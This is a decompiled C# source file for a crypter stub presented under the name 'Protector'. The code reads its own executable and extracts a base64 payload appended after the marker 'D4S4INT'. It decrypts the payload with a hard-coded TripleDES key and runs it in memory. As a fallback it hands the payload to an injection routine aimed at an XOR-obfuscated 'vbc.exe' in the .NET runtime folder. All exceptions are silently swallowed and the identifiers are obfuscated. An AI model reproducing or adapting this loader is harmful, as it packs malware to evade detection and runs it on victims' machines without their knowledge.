using System;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace Protector;

[StandardModule]
internal sealed class Module1
{
	private const string lPwLHMgSLRRbfcjmWeJgmdZ = "D4S4INT";

	private static string[] mFHkWNaFiNwHrqptRXpMgkb = Strings.Split(File.ReadAllText(Application.get_ExecutablePath()), "D4S4INT", -1, (CompareMethod)0);

	private static byte[] dkPsrKcYmdamiQotlvTUFEZ = hdfghdgdf(Convert.FromBase64String(mFHkWNaFiNwHrqptRXpMgkb[1]));

	private static object fhgdjfkhgkjdg = RuntimeEnvironment.GetRuntimeDirectory();

	public static void PtYpoHvYdiqoGkmtXhYqWDh(byte[] jfkghkjfhgkd)
	{
		try
		{
			Thread thread = new Thread(delegate(object a0)
			{
				wBXusJhKEjjtSiiCfejNKNB(RuntimeHelpers.GetObjectValue(a0));
			});
			thread.SetApartmentState(ApartmentState.STA);
			thread.Start(jfkghkjfhgkd);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	[STAThread]
	public static void Main()
	{
		Encoding.GetEncoding(1252).GetBytes(mFHkWNaFiNwHrqptRXpMgkb[1]);
		try
		{
			Assembly.Load(dkPsrKcYmdamiQotlvTUFEZ);
			PtYpoHvYdiqoGkmtXhYqWDh(dkPsrKcYmdamiQotlvTUFEZ);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			Amtheone.LvpTApnaJnJKmdVmtUbuPql(dkPsrKcYmdamiQotlvTUFEZ, Conversions.ToString(Operators.ConcatenateObject(fhgdjfkhgkjdg, tgASAFBAhvmHgoPhwBkXbrq(",89t?\"?", "ZAkjrcCUeHvQZrPnEBZNmKF"))));
			ProjectData.ClearProjectError();
		}
	}

	public static object wBXusJhKEjjtSiiCfejNKNB(object fjgljdflkgjdfg)
	{
		object result = default(object);
		try
		{
			MethodInfo entryPoint = Assembly.Load((byte[])fjgljdflkgjdfg).EntryPoint;
			if (entryPoint.GetParameters().Length == 1)
			{
				entryPoint.Invoke(null, new object[1] { new string[0] });
				return result;
			}
			entryPoint.Invoke(null, null);
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static byte[] hdfghdgdf(byte[] fthtuyj)
	{
		using TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider = new TripleDESCryptoServiceProvider();
		tripleDESCryptoServiceProvider.IV = new byte[8] { 19, 15, 67, 52, 43, 13, 72, 11 };
		tripleDESCryptoServiceProvider.Key = new byte[24]
		{
			12, 82, 33, 44, 75, 16, 97, 18, 19, 27,
			26, 34, 15, 27, 24, 47, 32, 67, 52, 92,
			41, 61, 23, 20
		};
		return tripleDESCryptoServiceProvider.CreateDecryptor().TransformFinalBlock(fthtuyj, 0, fthtuyj.Length);
	}

	private static object tgASAFBAhvmHgoPhwBkXbrq(string lgPhaDsobVSASfFuV, string oLKAJXpghOtYtMJjm)
	{
		string text = "";
		int num = Strings.Asc(oLKAJXpghOtYtMJjm);
		checked
		{
			short num2 = (short)Strings.Len(lgPhaDsobVSASfFuV);
			for (short num3 = 1; num3 <= num2; num3 = (short)unchecked(num3 + 1))
			{
				text += Conversions.ToString(Strings.Chr(num ^ Strings.Asc(Strings.Mid(lgPhaDsobVSASfFuV, unchecked((int)num3), 1))));
			}
			return text;
		}
	}
}
